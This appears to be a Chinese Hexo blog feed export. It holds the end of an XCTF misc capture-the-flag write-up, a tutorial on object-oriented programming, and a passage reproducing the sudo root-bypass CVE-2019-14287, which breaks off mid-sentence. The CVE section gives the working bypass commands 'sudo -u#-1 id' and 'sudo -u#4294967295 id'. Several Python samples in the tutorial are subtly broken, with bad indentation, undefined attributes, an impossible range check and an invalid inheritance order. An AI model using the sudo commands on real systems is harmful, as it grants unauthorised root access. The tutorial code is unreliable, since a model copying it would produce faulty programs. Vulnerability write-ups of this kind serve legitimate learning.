src="/2019/11/08/XCTF-adworld-misc-wp/12_2.jpg"></p><p>发现里面有zip和flag.txt还有6666.jpg。</p><p>追踪6666.jpg那一行的TCP请求，右键追踪TCP流</p><p><img src="/2019/11/08/XCTF-adworld-misc-wp/12_3.jpg" alt></p><p>由于图片JPG的文件头是<code>FFD8</code>文件尾是<code>FFD9</code>，将文件另存为 ，然后用文本编辑器，编辑导出的文件，查找并删除第一个jpg文件头（FFD8）和最后一个文件尾（FFD9）之外的字符串，剩下的全是十六进制字符串。然后把十六进制保存为图片，我用的“010 Editor”，打开后新建空白文件，复制图片十六进制字符串到粘贴板，点击菜单栏“Edit-Paste From-Paste From Hex Text”，然后保存为图片就行了，保存后的图片如下图。 </p><p><img src="/2019/11/08/XCTF-adworld-misc-wp/12_4.jpg" alt></p><p>刚才看到里面有存在一个hello.zip，便用foremost处理流量包，分理出一个压缩文件，里面就是flag.txt，为加密文件，联想至刚刚那张复原的图片，用密码<code>Th1s_1s_p4sswd_!!!</code>尝试打开文件，得到flag：<code>flag{3OpWdJ-JP6FzK-koCMAK-VkfWBq-75Un2z}</code></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Object-oriented Programming</title>
      <link href="/2019/10/21/Object-oriented-Programming/"/>
      <url>/2019/10/21/Object-oriented-Programming/</url>
      
        <content type="html"><![CDATA[<p>虽然一直再写面向对象编程的语言，但是压根没有对象可以面对，希望写完这篇能有对象可以让我面对！！！</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p> 面向对象编程(Object-oriented Programming,缩写：OOP)是软件工程中一种具有对象概念的编程范式(Programming Paradigm)，同时也是一种程序开发的抽象方针，与之对应的编程范式还有：函数式编程(Functional Programming)、过程式编程(Procedural Programming)、响应式编程(Reactive Programming)等。  </p><p>面向对象的程序设计（OOP）是面向过程程序设计的继承和发展，它不仅汲取了后者的精华，而且以一种更加接近人类思维的方式来分析和解决问题：程序是对现实世界的抽象和描述，现实世界的基本单元是物体，与之对应的，<strong>程序中的基本单元是对象</strong>。 </p><p>  面向对象思想认为：现实世界是由对象组成的，无论大到一个国家还是小到一个原子，都是如此。并且<strong>对象都由两部分组成： 描述对象状态或属性的数据（变量）以及描述对象行为或者功能的方法（函数）</strong>。并且与面向过程不同，<strong>面向对象是将数据和操作数据的函数紧密结合</strong>，共同构成对象来更加精确地描述现实世界，这是<strong>面向过程和面向对象两者最本质的区别。</strong> </p><h5 id="对象与类"><a href="#对象与类" class="headerlink" title="对象与类"></a>对象与类</h5><p>在面向对象编程中，最常见的表现就是基于类(Class)来表现的，每一个对象实例都有具体的类，即对象的类型。使用类的面向对象编程也称为基于类的编程(Class-based programming)，如常见的Java，C++；而与之类似的有基于原型的编程(Prototype-based programming)，如JavaScript。</p><ul><li>类：定义对象的数据格式(属性类型)和可用过程(方法)，同时也可能包含类成员的数据(如，常量)和过程(如，静态方法)，类其实就是对象的类型/原型(prototype)。</li><li>对象：类的实例，通过类实例化出来的具体实例。</li></ul><h3 id="面向对象的三大特征"><a href="#面向对象的三大特征" class="headerlink" title="面向对象的三大特征"></a>面向对象的三大特征</h3><p> 面向对象的三大特征分别是：封装、继承、多态 。</p><ul><li>封装(Encapsulation)</li></ul><p>通过对象隐藏程序的具体实现细节，将数据与操作包装在一起，对象与对象之间通过消息传递机制实现互相通信（方法调用），具体的表现就是通过提供访问接口实现消息的传入传出。</p><p>封装常常会通过控制访问权限来控制对象之间的互访权限，常见的访问权限：公有(<code>public</code>)，私有(<code>private</code>)，保护(<code>protected</code>)。某些语言可能还会提供更加具体的访问控制，如，Java的package。</p><p>封装的意义：由于封装隐藏了具体的实现，如果实现的改变或升级对于使用方而言是无感知的，提高程序的可维护性；而且封装鼓励程序员把特定数据与对数据操作的功能打包在一起，有利于应用程序的去耦。</p><ul><li>继承(Inheritance)</li></ul><p>支持类的语言基本都支持继承，继承即类之间可以继承，通过继承得到的类称为子类，被继承的类为父类，子类相对于父类更加具体化。</p><p>子类具有自己特有的属性和方法，并且子类使用父类的方法也可以覆盖(重写)父类方法，在某些语言中还支持多继承，但是也带来了覆盖的复杂性。</p><p>继承的意义：继承是代码复用的基础机制</p><ul><li>多态(Polymorphism)</li></ul><p>多态发生在运行期间，即子类型多态，指的是子类型是一种多态的形式，不同类型的对象实体有统一接口，相同的消息给予不同的对象会引发不同的动作。</p><p>多态的意义：提供了编程的灵活性，简化了类层次结构外部的代码，使编程更加注重关注点分离(Separation of concerns，SoC)</p><p>关于面向对象编程的设计模式，可以参考<a href="https://www.jianshu.com/p/3a81c69134c2" target="_blank" rel="noopener">谈谈面向对象编程</a></p><h2 id="Python3面向对象编程"><a href="#Python3面向对象编程" class="headerlink" title="Python3面向对象编程"></a>Python3面向对象编程</h2><blockquote><p>参考：</p><p> <a href="https://blog.csdn.net/weixin_42134789/article/details/80194788" target="_blank" rel="noopener">一文看懂Python面向对象编程核心思想(Python学习与Django入门必看)</a> </p><p> <a href="https://www.runoob.com/python3/python3-class.html" target="_blank" rel="noopener">Python3 面向对象</a></p><p> <a href="https://www.jianshu.com/p/954e9cc89579" target="_blank" rel="noopener">Python面向对象编程</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">people</span>:</span></span><br><span class="line">    <span class="comment">#默认为公有变量</span></span><br><span class="line">name = <span class="string">""</span></span><br><span class="line">    age = <span class="number">0</span></span><br><span class="line">    <span class="comment">#定义私有变量，即在变量前加入 __</span></span><br><span class="line">    __weight = <span class="number">0</span></span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#类专有方法，可重写</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,n,a,w)</span>:</span></span><br><span class="line">        self.name = n</span><br><span class="line">        self.age = a</span><br><span class="line">        self.__weight = w</span><br><span class="line">        self.num += <span class="number">1</span></span><br><span class="line">    <span class="comment">#类方法一般第一个参数为self</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">speak</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'I am %s,and I am %d years old'</span> % (self.name,self.age))</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tol</span><span class="params">(cls)</span>:</span></span><br><span class="line">        print(<span class="string">"total numble of people is &#123;&#125;"</span>.format(self.num))</span><br><span class="line">    <span class="comment">#这个为类方法，可直接使用people.tol()</span></span><br><span class="line">        </span><br><span class="line"><span class="comment">#student 继承people类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">student</span><span class="params">(people)</span>:</span></span><br><span class="line">    grade = <span class="string">""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,n,a,w,g)</span>:</span></span><br><span class="line">        people.__init__(self,n,a,w)</span><br><span class="line">        self.grade = g</span><br><span class="line"><span class="comment">#方法重写</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">speak</span><span class="params">(self)</span>:</span></span><br><span class="line">    print(<span class="string">"I am a %s student.\nMy name is %s"</span> % (self.grade,self.name))</span><br><span class="line">    <span class="comment">#类的私有方法</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__show_detail</span><span class="params">(self)</span>:</span></span><br><span class="line">    print(self.name+<span class="string">"\t"</span>+self.age+<span class="string">"\t"</span>+self.__weight+<span class="string">"\n"</span>+self.grade)</span><br><span class="line">    <span class="comment">#封装</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getWeight</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.weight</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment">#python有多重继承</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sample</span><span class="params">(people, student)</span>:</span></span><br><span class="line">    tag = <span class="string">""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,n,a,w,g,t)</span>:</span></span><br><span class="line">        people.__init__(self,n,a,w)</span><br><span class="line">        student.__init__(self,g=g)</span><br><span class="line">        tag = t</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">s1 = student(<span class="string">"Alice"</span>,<span class="number">16</span>,<span class="number">47</span>,<span class="string">"7th grades"</span>)</span><br></pre></td></tr></table></figure><p>python提供类的转有方法，可进行方法重写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">__init__ : 构造函数，在生成对象时调用</span><br><span class="line">__del__ : 析构函数，释放对象时使用</span><br><span class="line">__repr__ : 打印，转换</span><br><span class="line">__setitem__ : 按照索引赋值</span><br><span class="line">__getitem__: 按照索引获取值</span><br><span class="line">__len__: 获得长度</span><br><span class="line">__cmp__: 比较运算</span><br><span class="line">__call__: 函数调用</span><br><span class="line">__add__: 加运算</span><br><span class="line">__sub__: 减运算</span><br><span class="line">__mul__: 乘运算</span><br><span class="line">__truediv__: 除运算</span><br><span class="line">__mod__: 求余运算</span><br><span class="line">__pow__: 乘方</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">反向运算符重载：   </span><br><span class="line">__radd__: 加运算</span><br><span class="line">__rsub__: 减运算</span><br><span class="line">__rmul__: 乘运算</span><br><span class="line">__rdiv__: 除运算</span><br><span class="line">__rmod__: 求余运算</span><br><span class="line">__rpow__: 乘方</span><br><span class="line">    </span><br><span class="line">   </span><br><span class="line">复合重载运算符</span><br><span class="line">__iadd__: 加运算</span><br><span class="line">__isub__: 减运算</span><br><span class="line">__imul__: 乘运算</span><br><span class="line">__idiv__: 除运算</span><br><span class="line">__imod__: 求余运算</span><br><span class="line">__ipow__: 乘方</span><br></pre></td></tr></table></figure><hr><h4 id="注：-new-方法"><a href="#注：-new-方法" class="headerlink" title="注：__new__()方法"></a>注：__new__()方法</h4><p>python中定义的类在创建实例对象的时候，会自动执行init()方法，但是在执行init()方法之前，会执行new()方法。</p><p><em>new</em>()的作用主要有两个。</p><p>1.在内存中为对象分配空间<br>2.返回对象的引用。（即对象的内存地址）</p><p>python解释器在获得引用的时候会将其传递给init()方法中的self。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__new__</span><span class="params">(cls,*args,**kwargs)</span>:</span></span><br><span class="line">        print(<span class="string">'__new__'</span>)</span><br><span class="line">        <span class="keyword">return</span> super().__new__(cls)<span class="comment">#这里一定要返回，否则__init__()方法不会被执行</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span><span class="comment">#这里的self就是new方法中的return返回值</span></span><br><span class="line">        print(<span class="string">'__init__'</span>)</span><br><span class="line"></span><br><span class="line">a = A()</span><br></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__new__</span><br><span class="line">__init__</span><br></pre></td></tr></table></figure><p>我们一定要在<em>new</em>方法中最后调用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> super().__new__(cls)</span><br></pre></td></tr></table></figure><p>否则init方法不会被调用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__new__</span><span class="params">(cls,*args,**kwargs)</span>:</span></span><br><span class="line">        print(<span class="string">'__new__'</span>)</span><br><span class="line">        <span class="comment"># return super().__new__(cls)#这里一定要返回，否则__init__()方法不会被执行</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span><span class="comment">#这里的self就是new方法中的return返回值</span></span><br><span class="line">        print(<span class="string">'__init__'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = A()</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__new__</span><br></pre></td></tr></table></figure><p>像以前一样，我们不写<em>new</em>方法试试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>:</span></span><br><span class="line">    <span class="comment"># def __new__(cls,*args,**kwargs):</span></span><br><span class="line">    <span class="comment">#     print('__new__')</span></span><br><span class="line">        <span class="comment"># return super().__new__(cls)#这里一定要返回，否则__init__()方法不会被执行</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span><span class="comment">#这里的self就是new方法中的return返回值</span></span><br><span class="line">        print(<span class="string">'__init__'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = A()</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__init__</span><br></pre></td></tr></table></figure><hr><h2 id="私有属性-封装"><a href="#私有属性-封装" class="headerlink" title="私有属性-封装"></a>私有属性-封装</h2><p>在实际开发中，对象 的 某些属性或方法 可能只希望 在对象的内部被使用，而 不希望在外部被访问到</p><p><strong>定义方式</strong></p><p>在 定义属性或方法时，在 属性名或者方法名前 增加 两个下划线__ 实际开发中私有属性也不是一层不变的。所以要给私有属性提供外部能够操作的方法。</p><p>7.1) <strong>通过自定义get set方法提供私有属性的访问</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> __init__<span class="params">(<span class="keyword">self</span>, name, age)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">self</span>.name = name</span><br><span class="line">        <span class="keyword">self</span>.__age = age</span><br><span class="line"></span><br><span class="line">    <span class="comment">#定义对私有属性的get方法，获取私有属性</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getAge</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">self</span>.__age</span><br><span class="line"></span><br><span class="line">    <span class="comment">#定义对私有属性的重新赋值的set方法，重置私有属性</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setAge</span><span class="params">(<span class="keyword">self</span>,age)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">self</span>.__age = age</span><br><span class="line"></span><br><span class="line">person1 = Person(<span class="string">"tom"</span>,<span class="number">19</span>)</span><br><span class="line">person1.setAge(<span class="number">20</span>)</span><br><span class="line">print(person1.name,person1.getAge())  <span class="comment">#tom 20</span></span><br></pre></td></tr></table></figure><p>7.2) <strong>调用property方法提供私有属性的访问</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> __init__<span class="params">(<span class="keyword">self</span>, name, age)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">self</span>.name = name</span><br><span class="line">        <span class="keyword">self</span>.__age = age</span><br><span class="line"></span><br><span class="line">    <span class="comment">#定义对私有属性的get方法，获取私有属性</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getAge</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">self</span>.__age</span><br><span class="line"></span><br><span class="line">    <span class="comment">#定义对私有属性的重新赋值的set方法，重置私有属性</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setAge</span><span class="params">(<span class="keyword">self</span>,age)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">self</span>.__age = age</span><br><span class="line"></span><br><span class="line">    p = property(getAge,setAge) <span class="comment">#注意里面getAge,setAge不能带()</span></span><br><span class="line"></span><br><span class="line">s1 = Student(<span class="string">"jack"</span>,<span class="number">22</span>)</span><br><span class="line">s1.p = <span class="number">23</span> <span class="comment">#如果使用=,则会判断为赋值，调用setAge方法。</span></span><br><span class="line">print(s1.name,s1.p)  <span class="comment">#jack 23   ，直接使用s1.p会自动判断会取值，调用getAge</span></span><br><span class="line">print(s1.name,s1.getAge()) <span class="comment">#jack 23,这个时候set,get方法可以单独使用。</span></span><br></pre></td></tr></table></figure><p>7.3) <strong>使用property标注提供私有属性的访问</strong></p><p>注意： 一旦给函数加上一个装饰器@property,调用函数的时候不用加括号就可以直接调用函数了 </p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Teacher</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> __init__<span class="params">(<span class="keyword">self</span>, name, age,speak)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">self</span>.name = name</span><br><span class="line">        <span class="keyword">self</span>.__age = age</span><br><span class="line">        <span class="keyword">self</span>.__speak = speak</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @property      <span class="comment">#注意1.<span class="doctag">@proterty</span>下面默认跟的是get方法，如果设置成set会报错。</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">age</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">self</span>.__age</span><br><span class="line"></span><br><span class="line">    @age.setter    <span class="comment">#注意2.这里是使用的上面函数名.setter，不是property.setter.</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">age</span><span class="params">(<span class="keyword">self</span>,age)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">if</span> age &gt; <span class="number">150</span> <span class="keyword">and</span> age &lt;=<span class="number">0</span>:  <span class="comment">#还可以在setter方法里增加判断条件</span></span><br><span class="line">            print(<span class="string">"年龄输入有误"</span>)</span><br><span class="line">        <span class="symbol">else:</span></span><br><span class="line">            <span class="keyword">self</span>.__age = age</span><br><span class="line"></span><br><span class="line">    @property</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">for_speak</span><span class="params">(<span class="keyword">self</span>)</span></span>:  <span class="comment">#注意2.这个同名函数名可以自定义名称，一般都是默认使用属性名。</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">self</span>.__speak</span><br><span class="line"></span><br><span class="line">    @for_speak.setter</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">for_speak</span><span class="params">(<span class="keyword">self</span>, speak)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">self</span>.__speak = speak</span><br><span class="line"></span><br><span class="line">t1 = Teacher(<span class="string">"herry"</span>,<span class="number">45</span>,<span class="string">"Chinese"</span>)</span><br><span class="line">t1.age = <span class="number">38</span>    <span class="comment">#注意4.有了property后，直接使用t1.age,而不是t1.age()方法了。</span></span><br><span class="line">t1.for_speak = <span class="string">"English"</span>  </span><br><span class="line"></span><br><span class="line">print(t1.name,t1.age,t1.for_speak)  <span class="comment">#herry 38 English</span></span><br></pre></td></tr></table></figure><hr><h2 id="C-面向对象编程"><a href="#C-面向对象编程" class="headerlink" title="C++面向对象编程"></a>C++面向对象编程</h2><blockquote><p>引用：</p><p><a href="https://www.cnblogs.com/wpbing/p/9774818.html" target="_blank" rel="noopener">c++面向对象程序设计总结(类的使用)</a></p><p><a href="https://www.runoob.com/cplusplus/cpp-classes-objects.html" target="_blank" rel="noopener">C++ 类 &amp; 对象</a></p><p><a href="https://blog.csdn.net/u012940886/article/details/80381398" target="_blank" rel="noopener">C++面向对象基础</a></p></blockquote><h4 id="析构函数"><a href="#析构函数" class="headerlink" title="析构函数"></a>析构函数</h4><p>析构函是类的一个成员函数，名字由波浪号接类名构成。它没有返回值，也不接受参数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span>&#123;</span> </span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">      ~Foo();   <span class="comment">//析构函数</span></span><br><span class="line">      <span class="comment">//...</span></span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure><p>由于析构函数不接受参数，因此它不能被重载。对于一个给定类，只会由唯一一个析构函数。</p><p>在一个构造函数中，成员的初始化时在函数体执行之前完成的，且按照它们在类中出现的顺序进行初始化。在一个析构函数中，首先执行函数体，然后销毁成员。成员按初始化顺序的逆序进行销毁。</p><p>无论何时一个对象被销毁，就会自动调用其析构函数：</p><blockquote><p>​    1.变量在离开其作用域时被销毁<br>​    2.当一个对象被销毁时，其成员被销毁<br>​    3.容器(无论是标准容器还是数组)被销毁时，其元素被销毁<br>​    4.对于动态分配的对象，当对指向它的指针应用delete运算符时被销毁<br>​    5.对于临时对象，当创建它的完整表达式结束时被销毁</p></blockquote><blockquote><blockquote><blockquote><p>未完待续</p></blockquote></blockquote></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-14287</title>
      <link href="/2019/10/18/CVE-2019-14287/"/>
      <url>/2019/10/18/CVE-2019-14287/</url>
      
        <content type="html"><![CDATA[<blockquote><p>引用：</p><p><a href="https://www.sudo.ws/alerts/minus_1_uid.html" target="_blank" rel="noopener">Potential bypass of Runas user restrictions  (sudo official page)</a></p><p><a href="https://www.freebuf.com/vuls/217089.html" target="_blank" rel="noopener">CVE-2019-14287：sudo权限绕过漏洞分析与复现</a></p><p><a href="http://baijiahao.baidu.com/s?id=1647516935984812975&amp;wfr=spider&amp;for=pc" target="_blank" rel="noopener">Linux Sudo暴userID提权漏洞CVE-2019-14287</a></p><p><a href="https://www.jianshu.com/p/8cbebd4e429a" target="_blank" rel="noopener">sudo 用法简介</a></p></blockquote><p>第一次复现CVE漏洞，十分滴激动</p><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>Sudo 的全称是“superuserdo”，它是Linux系统管理指令，允许用户在不需要切换环境的前提下以其它用户的权限运行应用程序或命令。通常以 root 用户身份运行命令，是为了减少 root 用户的登录和管理时间，同时提高安全性。</p><p>2019年10月14日，Sudo官方发布了Sudo 1.8.28版本，其中包含sudo root权限绕过漏洞（CVE-2019-14287）的补丁修复。</p><h3 id="利用前提"><a href="#利用前提" class="headerlink" title="利用前提"></a>利用前提</h3><ol><li>sudo -v &lt; 1.8.28</li><li>知道当前用户的密码</li><li>当前用户存在于sudo权限列表</li></ol><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>复现是在sudo 1.8.16的版本下进行的，对于低于1.8.28的版本都起作用</p><p><img src="/2019/10/18/CVE-2019-14287/sudoers_1.jpg" alt></p><p><img src="/2019/10/18/CVE-2019-14287/sudo_1.jpg" alt></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">testALL=(ALL,!root)/usr/bin/id</span><br></pre></td></tr></table></figure><p>其中，在sudoers配置中，以上语句代表着test用户，ALL=(ALL,!root)代表指定用户，即所有除root以外的用户都可运行命令<code>/usr/bin/id</code></p><p> 一般情况下，大多数Linux发行版的Runas规范（/etc /sudoers）都如下图（第三张图）所示，其中定义的ALL关键字将允许admin或sudo组中的用户以目标系统中的任意用户身份来运行命令 </p><p>如果想利用该漏洞来实施攻击，用户需要拥有sudo权限，并允许用户使用任意用户ID来运行命令（如下图中定义了test用户可用id命令，但不能以root用户执行命令id（<code>test  ALL=(ALL,!root) /usr/bin/id</code>））。通常来说，这意味着用户的sudoer项在Runas规范中定义了特殊的ALL值。如果sudoer策略允许的话，sudo支持由用户指定的用户名或用户ID来运行命令。</p><p>如果sudoer条目允许用户以任意用户身份运行命令（非root），那么攻击者就可以利用该漏洞来绕过这种限制了。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -u<span class="comment">#-1 id</span></span><br><span class="line">sudo -u<span class="comment">#4294967295 id</span></span><br></pre></td></tr></table></figure><p>上述命令运行之后，将返回“0”。这是因为sudo命令本身已经在以用户ID“0”运行了，所以当sudo尝试将用户ID修改为“-1”时，不会发生任何变化。</p><p>但是，sudo日志条目中记录下的命令运行用户的ID为“4294967295”，而并非root用户（或用户ID为“0”），除此之外，因为用户ID是通过-u选项指定的，并且不会在密码数据库中存储，所以PAM会话模块也不会运行。</p><p><img src="/2019/10/18/CVE-2019-14287/sudoers.jpg" alt></p><p><strong>漏洞片段</strong></p><p><img src="/2019/10/18/CVE-2019-14287/sudo_2.jpg" alt></p><p><img src="/2019/10/18/CVE-2019-14287/sudo_3.jpg" alt></p><p> 漏洞CVE-2019-14287的源于sudo调用的系统函数setresuid()和setreuid()在参数处理中会将 -1（或其等效的无符号整数4294967295）误认为是 0，而这正好是 